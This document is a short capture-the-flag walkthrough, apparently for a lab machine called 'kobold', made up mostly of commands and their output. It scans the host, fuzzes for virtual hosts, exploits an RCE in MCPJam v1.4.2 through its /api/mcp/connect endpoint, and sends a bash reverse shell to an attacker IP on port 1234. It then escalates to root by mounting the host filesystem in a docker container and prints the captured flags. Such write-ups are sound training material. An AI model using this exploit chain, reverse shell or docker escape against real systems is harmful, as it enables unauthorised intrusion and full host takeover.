```bash

nmap -sV -sC 10.129.11.71 -oN nmap.txt                                                                                                                                               1 ↵
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-24 03:06 CET
Nmap scan report for 10.129.11.71
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-server-header: nginx/1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Not valid before: 2026-03-15T15:08:55
|_Not valid after:  2125-02-19T15:08:55
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://kobold.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# fuffing the vhosts
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u https://10.129.11.71 -H "Host: FUZZ.kobold.htb" -fs 154 
#find : mcp.kobold.htb


# browsing the website mcp.kobold.htb and find the MCPJam Version: v1.4.2 in the setting tab and this versio have [CVE-2026-23744](https://github.com/advisories/GHSA-232v-j27c-5pp6) RCE

# test the vlun and it work
curl -k https://mcp.kobold.htb/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data "{\"serverConfig\":{\"command\":\"curl\",\"args\":[\"http://10.10.15.24:8000/\",\"-k\"]},\"serverId\":\"test\"}"
  

# revser shell 
curl -k https://mcp.kobold.htb/api/mcp/connect \\n  --header "Content-Type: application/json" \\n  --data '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.15.24/1234 0>&1"]},"serverId":"test"}'

nc -lnvp 1234
id # uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
cat /home/ben/user.txt  # ae7bea77b5bac5eb6989ae7d4243d24e {FLAG 1}

# priv esc 



sg docker -c "docker images"
sg docker -c "docker run --entrypoint /bin/sh -u 0 -v /:/mnt -it privatebin/nginx-fpm-alpine:2.0.2"
/mnt/root # cat root.txt    
cat root.txt
69a5009d58807f1280f9a071cee9c0b1

# or auto pwn 
sg docker -c "docker run -it --entrypoint /bin/sh -u 0 -v /:/host privatebin/nginx-fpm-alpine:2.0.2 -c 'chroot /host /bin/sh'"

```